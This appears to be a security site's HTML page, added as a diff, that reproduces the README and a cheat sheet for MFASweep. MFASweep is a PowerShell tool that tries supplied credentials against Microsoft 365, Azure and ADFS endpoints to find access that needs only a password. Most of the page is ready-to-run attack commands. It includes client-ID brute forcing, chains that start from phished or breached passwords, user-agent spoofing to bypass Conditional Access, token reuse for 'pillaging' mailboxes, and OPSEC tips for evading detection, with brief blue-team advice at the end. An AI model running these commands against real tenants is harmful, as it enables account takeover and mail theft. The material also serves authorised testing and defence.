@@ -1,0 +1,427 @@
+<!doctype html>
+<html lang="en-GB">
+<head>
+<meta charset="utf-8">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src 'self' data:; style-src 'self'; script-src 'self'; base-uri 'self'; form-action 'self'; connect-src 'self'">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>MFASweep - Breachcraft Dev</title>
+<meta name="description" content="MFASweep is a PowerShell script that attempts to log in to various Microsoft services using a provided set of credentials and will attempt to identify if MFA...">
+<link rel="canonical" href="https://breachcraft.dev/tools/mfasweep/">
+<link rel="icon" href="/assets/mark.svg" type="image/svg+xml">
+<link rel="stylesheet" href="/styles.css">
+<meta name="theme-color" content="#0b1014">
+</head>
+<body>
+<main>
+  <p class="brand">Breachcraft<span>Dev</span></p>
+  <p class="badge"><span>Azure tool</span> upstream README &middot; captured 22 Nov 2026</p>
+  <p class="kicker">MFASweep</p>
+  <h1>MFASweep</h1>
+  <p class="lede">MFASweep is a PowerShell script that attempts to log in to various Microsoft services using a provided set of credentials and will attempt to identify if MFA...</p>
+  <h2>What it is</h2>
+<p>Currently MFASweep has the ability to login to the following services:</p>
+<ul>
+<li>Microsoft Graph API</li>
+<li>Azure Service Management API</li>
+<li>Microsoft 365 Exchange Web Services</li>
+<li>Microsoft 365 Web Portal w/ 6 device types (Windows, Linux, MacOS, Android Phone, iPhone, Windows Phone)</li>
+<li>Microsoft 365 Active Sync</li>
+<li>ADFS</li>
+</ul>
+<p><strong>WARNING: This script attempts to login to the provided account TEN (10) different times (11 if you include ADFS). If you entered an incorrect password this may lock the account out.</strong></p>
+<p>For more information check out the blog post here: <a href="https://www.blackhillsinfosec.com/exploiting-mfa-inconsistencies-on-microsoft-services/">Exploiting MFA Inconsistencies on Microsoft Services</a></p>
+<h3>Usage</h3>
+<p>This command will use the provided credentials and attempt to authenticate to the Microsoft Graph API, Azure Service Management API, Microsoft 365 Exchange Web Services, Microsoft 365 Web Portal with both a desktop browser and mobile, and Microsoft 365 Active Sync. If any authentication methods result in success, tokens and/or cookies will be written to AccessTokens.json. (Currently does not log cookies or tokens for EWS, ActiveSync, and ADFS)</p>
+<pre><code>Invoke-MFASweep -Username targetuser@targetdomain.com -Password Winter2024 -WriteTokens </code></pre>
+<p>This command runs with the default auth methods and checks for ADFS as well.</p>
+<pre><code>Invoke-MFASweep -Username targetuser@targetdomain.com -Password Winter2020 -Recon -IncludeADFS</code></pre>
+<h3>Individual Modules</h3>
+<p>Each individual module can be run separately if needed as well.</p>
+<p><strong>Microsoft Graph API</strong></p>
+<pre><code>Invoke-GraphAPIAuth -Username targetuser@targetdomain.com -Password Winter2020 </code></pre>
+<p><strong>Azure Service Management API</strong></p>
+<pre><code>Invoke-AzureManagementAPIAuth -Username targetuser@targetdomain.com -Password Winter2020 </code></pre>
+<p><strong>Microsoft 365 Exchange Web Services</strong></p>
+<pre><code>Invoke-EWSAuth -Username targetuser@targetdomain.com -Password Winter2020 </code></pre>
+<p><strong>Microsoft 365 Web Portal</strong></p>
+<pre><code>Invoke-O365WebPortalAuth -Username targetuser@targetdomain.com -Password Winter2020 </code></pre>
+<p><strong>Microsoft 365 Web Portal w/ Mobile User Agent</strong></p>
+<pre><code>Invoke-O365WebPortalAuthMobile -Username targetuser@targetdomain.com -Password Winter2020 </code></pre>
+<p><strong>Microsoft 365 Active Sync</strong></p>
+<pre><code>Invoke-O365ActiveSyncAuth -Username targetuser@targetdomain.com -Password Winter2020 </code></pre>
+<p><strong>ADFS</strong></p>
+<pre><code>Invoke-ADFSAuth -Username targetuser@targetdomain.com -Password Winter2020 </code></pre>
+<h4>Brute Forcing Client IDs During ROPC Auth</h4>
+<p>The Invoke-BruteClientIDs function will loop through various resource types and client IDs during ROPC auth to find single factor access for various combinations of client IDs and resources. If any authentication methods result in success, tokens and/or cookies will be written to AccessTokens.json. (Currently does not log cookies or tokens for EWS, ActiveSync, and ADFS)</p>
+<pre><code>Invoke-BruteClientIDs -Username targetuser@targetdomain.com -Password Winter2024 -VerboseOut</code></pre>
+  <h2>Commands</h2>
+<ul class="facts"><li><strong>Type</strong> PowerShell Script</li><li><strong>Purpose</strong> Identify single-factor authentication gaps in Microsoft 365 services despite MFA being enabled</li><li><strong>Platform</strong> Windows, PowerShell Core</li><li><strong>Tags</strong> #mfa #conditional-access #m365 #authentication #bypass #initial-access #powershell #ews #activesync</li></ul>
+<h3>Installation &amp; Setup</h3>
+<pre><code># Clone repository
+git clone https://github.com/dafthack/MFASweep.git
+cd MFASweep
+
+# Import module
+Import-Module .\MFASweep.ps1
+
+# Or dot-source
+. .\MFASweep.ps1</code></pre>
+<h3>Quick Reference (Most Common Commands)</h3>
+<pre><code># Full MFA sweep (all protocols)
+Invoke-MFASweep -Username user@company.com -Password 'P@ssw0rd!'
+
+# With ADFS check
+Invoke-MFASweep -Username user@company.com -Password 'P@ssw0rd!' -IncludeADFS
+
+# Save tokens to file
+Invoke-MFASweep -Username user@company.com -Password 'P@ssw0rd!' -WriteTokens
+
+# Brute force client IDs
+Invoke-BruteClientIDs -Username user@company.com -Password 'P@ssw0rd!' -VerboseOut</code></pre>
+<h3>CRED: MFA Gap Discovery</h3>
+<h4>CRED: Full MFA Sweep</h4>
+<p><strong>Use Case:</strong> Test all Microsoft services for MFA gaps</p>
+<pre><code># Test all protocols
+Invoke-MFASweep -Username user@company.com -Password 'Winter2024!'
+
+# Tests 10 different authentication methods:
+# 1. Microsoft Graph API
+# 2. Azure Service Management API
+# 3. Exchange Web Services (EWS)
+# 4. M365 Web Portal (Windows)
+# 5. M365 Web Portal (Linux)
+# 6. M365 Web Portal (MacOS)
+# 7. M365 Web Portal (Android)
+# 8. M365 Web Portal (iPhone)
+# 9. M365 Web Portal (Windows Phone)
+# 10. ActiveSync
+
+# WARNING: 10 login attempts - may cause lockout if password is wrong!</code></pre>
+<h4>CRED: MFA Sweep with ADFS</h4>
+<p><strong>Use Case:</strong> Include on-premises ADFS testing</p>
+<pre><code># Include ADFS check (11th attempt)
+Invoke-MFASweep -Username user@company.com -Password 'P@ssw0rd!' -IncludeADFS
+
+# Also performs reconnaissance on ADFS configuration
+Invoke-MFASweep -Username user@company.com -Password 'P@ssw0rd!' -Recon -IncludeADFS</code></pre>
+<h4>CRED: Save Access Tokens</h4>
+<p><strong>Use Case:</strong> Capture successful authentication tokens</p>
+<pre><code># Write tokens to AccessTokens.json
+Invoke-MFASweep -Username user@company.com -Password 'P@ssw0rd!' -WriteTokens
+
+# Saves tokens for:
+# - Graph API
+# - Azure Management API
+# - O365 Web Portal (various devices)
+
+# NOTE: Does not save tokens for EWS, ActiveSync, ADFS</code></pre>
+<h3>CRED: Individual Protocol Testing</h3>
+<h4>CRED: Microsoft Graph API</h4>
+<p><strong>Use Case:</strong> Test Graph API for MFA</p>
+<pre><code># Graph API authentication
+Invoke-GraphAPIAuth -Username user@company.com -Password 'P@ssw0rd!'
+
+# If successful without MFA:
+# - Can use Graph API tokens
+# - Access to user data, mail, files, etc.</code></pre>
+<h4>CRED: Azure Service Management API</h4>
+<p><strong>Use Case:</strong> Test Azure Management for MFA</p>
+<pre><code># Azure Management API
+Invoke-AzureManagementAPIAuth -Username user@company.com -Password 'P@ssw0rd!'
+
+# If successful without MFA:
+# - Can manage Azure resources
+# - List VMs, storage, etc.</code></pre>
+<h4>CRED: Exchange Web Services (EWS)</h4>
+<p><strong>Use Case:</strong> Test EWS for MFA</p>
+<pre><code># EWS authentication
+Invoke-EWSAuth -Username user@company.com -Password 'P@ssw0rd!'
+
+# If successful without MFA:
+# - Can access mailbox via EWS
+# - Read/send emails
+# - Often bypasses MFA</code></pre>
+<h4>CRED: O365 Web Portal</h4>
+<p><strong>Use Case:</strong> Test web portal with different device types</p>
+<pre><code># Desktop browser (default)
+Invoke-O365WebPortalAuth -Username user@company.com -Password 'P@ssw0rd!'
+
+# Mobile user agents (6 types)
+Invoke-O365WebPortalAuthMobile -Username user@company.com -Password 'P@ssw0rd!'
+
+# Tests with user agents:
+# - Windows desktop
+# - Linux desktop
+# - MacOS desktop
+# - Android phone
+# - iPhone
+# - Windows Phone
+
+# Different user agents may bypass MFA based on CA policies</code></pre>
+<h4>CRED: ActiveSync</h4>
+<p><strong>Use Case:</strong> Test ActiveSync protocol</p>
+<pre><code># ActiveSync authentication
+Invoke-O365ActiveSyncAuth -Username user@company.com -Password 'P@ssw0rd!'
+
+# If successful without MFA:
+# - Can sync email via ActiveSync
+# - Mobile device protocol
+# - Commonly left single-factor</code></pre>
+<h4>CRED: ADFS</h4>
+<p><strong>Use Case:</strong> Test on-premises ADFS</p>
+<pre><code># ADFS authentication
+Invoke-ADFSAuth -Username user@company.com -Password 'P@ssw0rd!'
+
+# Tests on-prem ADFS server
+# May have different MFA config than cloud</code></pre>
+<h3>CRED: Advanced Client ID Brute Force</h3>
+<h4>CRED: Brute Force Client IDs</h4>
+<p><strong>Use Case:</strong> Find single-factor access via different client ID combinations</p>
+<pre><code># Brute force various client IDs and resources
+Invoke-BruteClientIDs -Username user@company.com -Password 'P@ssw0rd!' -VerboseOut
+
+# Tests many combinations of:
+# - Client IDs (different MS applications)
+# - Resource types
+# - ROPC (Resource Owner Password Credential) flow
+
+# Finds overlooked single-factor access points
+# Writes successful tokens to AccessTokens.json</code></pre>
+<h3>Attack Patterns</h3>
+<h4>Pattern: Password Spray → MFA Sweep → Exploit Gaps</h4>
+<pre><code># 1. First, obtain valid credentials
+# (via o365spray, breach data, phishing, etc.)
+
+# 2. Run MFA sweep to find single-factor protocols
+Invoke-MFASweep -Username compromised@company.com -Password 'Summer2024!' -WriteTokens
+
+# 3. Review results
+# Look for SUCCESS without MFA prompt
+
+# 4. Exploit single-factor protocol
+# If EWS is single-factor:
+Invoke-EWSAuth -Username compromised@company.com -Password 'Summer2024!'
+# Access mailbox without MFA
+
+# If ActiveSync is single-factor:
+Invoke-O365ActiveSyncAuth -Username compromised@company.com -Password 'Summer2024!'
+# Sync mail to mobile client without MFA</code></pre>
+<h4>Pattern: Conditional Access Bypass via User Agent</h4>
+<pre><code># 1. Run MFA sweep
+Invoke-MFASweep -Username user@company.com -Password 'P@ssw0rd!'
+
+# 2. Check which device types allow single-factor
+# Example results:
+# - Windows desktop: MFA Required
+# - iPhone: SUCCESS (no MFA!)
+# - Android: MFA Required
+
+# 3. Use successful user agent for access
+# Spoof iPhone user agent in subsequent requests
+# Bypass CA policy that requires MFA for desktops only</code></pre>
+<h4>Pattern: Client ID Discovery for Token Theft</h4>
+<pre><code># 1. Brute force client IDs
+Invoke-BruteClientIDs -Username user@company.com -Password 'P@ssw0rd!' -VerboseOut
+
+# 2. Identify client ID + resource combinations that work single-factor
+
+# 3. Use discovered client IDs for:
+# - Token requests
+# - OAuth flows
+# - Resource access without MFA</code></pre>
+<h4>Pattern: Federated vs Cloud MFA Bypass</h4>
+<pre><code># 1. Check if tenant is federated
+Invoke-MFASweep -Username user@company.com -Password 'P@ssw0rd!' -Recon
+
+# 2. If federated, test ADFS
+Invoke-MFASweep -Username user@company.com -Password 'P@ssw0rd!' -IncludeADFS
+
+# 3. Often ADFS has different MFA config than cloud
+# May find single-factor on-prem access even if cloud requires MFA</code></pre>
+<h3>Common MFA Gaps</h3>
+<h4>Frequently Single-Factor Protocols</h4>
+<p><strong>Exchange Web Services (EWS):</strong></p>
+<ul>
+<li>Legacy protocol</li>
+<li>Often excluded from CA policies</li>
+<li>Allows mailbox access</li>
+<li>Can read/send emails</li>
+</ul>
+<p><strong>ActiveSync:</strong></p>
+<ul>
+<li>Mobile device protocol</li>
+<li>Commonly left single-factor for "user convenience"</li>
+<li>Full mailbox sync capability</li>
+<li>May sync contacts, calendar too</li>
+</ul>
+<p><strong>Legacy Authentication:</strong></p>
+<ul>
+<li>POP3, IMAP, SMTP</li>
+<li>Often not covered by modern CA policies</li>
+<li>Basic authentication</li>
+</ul>
+<p><strong>Different Device Types:</strong></p>
+<ul>
+<li>Mobile devices (iOS/Android) may be excluded</li>
+<li>"Trusted" OS types bypass MFA</li>
+<li>Misconfigured CA policies</li>
+</ul>
+<p><strong>ADFS:</strong></p>
+<ul>
+<li>On-prem may have weaker MFA</li>
+<li>Different policies than cloud</li>
+<li>Federation trust can be abused</li>
+</ul>
+<h3>Understanding Results</h3>
+<h4>Success without MFA</h4>
+<pre><code>[+] SUCCESS: Protocol Name
+    No MFA challenge presented
+    Single-factor access confirmed</code></pre>
+<p><strong>Action:</strong> Exploit this protocol for access</p>
+<h4>MFA Required</h4>
+<pre><code>[-] FAILURE: Protocol Name
+    MFA required
+    Cannot proceed with password only</code></pre>
+<p><strong>Action:</strong> This protocol is properly protected</p>
+<h4>Authentication Failed</h4>
+<pre><code>[-] FAILURE: Protocol Name
+    Authentication failed
+    Invalid credentials or account locked</code></pre>
+<p><strong>Action:</strong> Verify credentials, check for lockout</p>
+<h3>Access Token Usage</h3>
+<h4>Using Saved Tokens</h4>
+<pre><code># Tokens saved to AccessTokens.json
+
+# Load tokens
+$tokens = Get-Content AccessTokens.json | ConvertFrom-Json
+
+# Use Graph API token
+$graphToken = $tokens.GraphAPIToken
+
+# Use with other tools
+# AADInternals:
+Import-Module AADInternals
+# Use token with AADInternals commands
+
+# PowerShell:
+$headers = @{Authorization = "Bearer $graphToken"}
+Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me" -Headers $headers</code></pre>
+<h3>Pro Tips</h3>
+<p>💡 <strong>Lockout Warning</strong>: 10-11 login attempts - ensure correct password to avoid lockout 💡 <strong>EWS is Common</strong>: EWS frequently left single-factor - high value target 💡 <strong>ActiveSync Gold</strong>: Mobile sync protocol often overlooked in CA policies 💡 <strong>Device Type Matters</strong>: iOS/Android may bypass MFA that desktop requires 💡 <strong>Client ID Brute</strong>: Use Invoke-BruteClientIDs to find obscure access paths 💡 <strong>Save Tokens</strong>: Always use -WriteTokens to preserve successful access 💡 <strong>ADFS Different</strong>: On-prem ADFS may have weaker MFA than cloud 💡 <strong>CA Policy Gaps</strong>: Most MFA bypasses due to misconfigured Conditional Access 💡 <strong>Legacy Protocols</strong>: Older protocols (EWS, ActiveSync) commonly excluded 💡 <strong>Recon First</strong>: Use -Recon to understand tenant configuration before attacking</p>
+<h3>Conditional Access Policy Analysis</h3>
+<h4>Common CA Policy Mistakes</h4>
+<p><strong>Excluding Legacy Protocols:</strong></p>
+<ul>
+<li>EWS, ActiveSync, POP3, IMAP not covered</li>
+<li>"Modern authentication only" policies</li>
+</ul>
+<p><strong>Device Platform Exclusions:</strong></p>
+<ul>
+<li>Mobile devices (iOS/Android) excluded for "usability"</li>
+<li>Specific OS types trusted implicitly</li>
+</ul>
+<p><strong>Application Exclusions:</strong></p>
+<ul>
+<li>Certain apps excluded from MFA</li>
+<li>"Trusted" applications list too broad</li>
+</ul>
+<p><strong>Location-Based:</strong></p>
+<ul>
+<li>Internal/trusted networks bypass MFA</li>
+<li>VPN connections exempt</li>
+</ul>
+<p><strong>User/Group Exceptions:</strong></p>
+<ul>
+<li>Service accounts excluded</li>
+<li>IT administrators exempt (risky!)</li>
+</ul>
+<h3>OPSEC Considerations</h3>
+<p>⚠️ <strong>High Risk:</strong></p>
+<ul>
+<li>10+ authentication attempts (lockout danger)</li>
+<li>All attempts logged in Azure AD sign-in logs</li>
+<li>Failed attempts generate alerts</li>
+<li>May trigger account lockout</li>
+</ul>
+<p>⚠️ <strong>Medium Risk:</strong></p>
+<ul>
+<li>Successful single-factor access logged</li>
+<li>Authentication from new location/IP</li>
+<li>Unusual user agent strings</li>
+</ul>
+<p>✅ <strong>Lower Risk:</strong></p>
+<ul>
+<li>Using valid credentials (no failed auth)</li>
+<li>Matching normal user behavior patterns</li>
+<li>Spacing out attempts over time</li>
+</ul>
+<p><strong>Detection Vectors:</strong></p>
+<ul>
+<li>Azure AD sign-in logs (all 10-11 attempts visible)</li>
+<li>Multiple authentication method attempts</li>
+<li>Failed authentication alerts</li>
+<li>Account lockout events</li>
+<li>Unusual protocol usage (EWS, ActiveSync from new location)</li>
+<li>CA policy compliance logs</li>
+</ul>
+<h3>Recommendations for Defense</h3>
+<h4>For Blue Team</h4>
+<p><strong>Close MFA Gaps:</strong></p>
+<ol>
+<li>Enable MFA for all protocols (including legacy)</li>
+<li>Use Conditional Access to require MFA for all apps</li>
+<li>Block legacy authentication entirely</li>
+<li>Apply consistent policies across all device types</li>
+<li>Enforce MFA on ADFS (on-prem)</li>
+</ol>
+<p><strong>Detection:</strong></p>
+<ol>
+<li>Monitor for legacy protocol usage (EWS, ActiveSync)</li>
+<li>Alert on authentication from unusual locations</li>
+<li>Track accounts with single-factor access</li>
+<li>Review CA policy exclusions regularly</li>
+<li>Monitor for rapid authentication attempts (like MFASweep)</li>
+</ol>
+<p><strong>Audit:</strong></p>
+<pre><code># Review CA policies
+Get-AzureADMSConditionalAccessPolicy
+
+# Check for legacy auth
+# Review sign-in logs for:
+# - EWS
+# - ActiveSync
+# - SMTP Auth
+# - POP3/IMAP</code></pre>
+<h3>Integration with Other Tools</h3>
+<h4>Use with AADInternals</h4>
+<pre><code># 1. Find MFA gap with MFASweep
+Invoke-MFASweep -Username user@company.com -Password 'P@ssw0rd!' -WriteTokens
+
+# 2. Load tokens
+$tokens = Get-Content AccessTokens.json | ConvertFrom-Json
+
+# 3. Use with AADInternals
+Import-Module AADInternals
+# Use saved tokens for AADInternals operations</code></pre>
+<h4>Use with GraphRunner</h4>
+<pre><code># 1. Get single-factor Graph API access
+Invoke-GraphAPIAuth -Username user@company.com -Password 'P@ssw0rd!'
+
+# 2. Use token with GraphRunner
+Import-Module GraphRunner
+# Use token for pillaging operations</code></pre>
+<h3>Resources</h3>
+<ul>
+<li>GitHub: <a href="https://github.com/dafthack/MFASweep">https://github.com/dafthack/MFASweep</a></li>
+<li>Blog: <a href="https://www.blackhillsinfosec.com/exploiting-mfa-inconsistencies-on-microsoft-services/">https://www.blackhillsinfosec.com/exploiting-mfa-inconsistencies-on-microsoft-services/</a></li>
+<li>Author: @dafthack (Beau Bullock)</li>
+<li>Company: Black Hills Information Security</li>
+</ul>
+  <p class="licence">Captured from <a href="https://github.com/AzureFactory/Azure_Offensive_Tooling">AzureFactory/Azure_Offensive_Tooling</a> on 22 Nov 2026. Upstream content, reproduced as captured; each tool keeps its own licence. Private, all rights reserved.</p>
+  <p class="action"><a href="/tools/">All tools</a> &rarr;</p>
+  <p class="small">Elsewhere &middot; <a href="https://breachcraftsecurity.com/">Services</a> &middot; <a href="https://breachcraft.academy/">Academy</a> &middot; <a href="https://breachcraft.app/">Labs</a> &middot; <a href="https://breachcraft.org/">Standards</a></p>
+  <p class="small">Breachcraft Security &middot; Evilsaint Ltd &middot; <a href="mailto:hello@breachcraftsecurity.com">hello@breachcraftsecurity.com</a></p>
+</main>
+</body>
+</html>
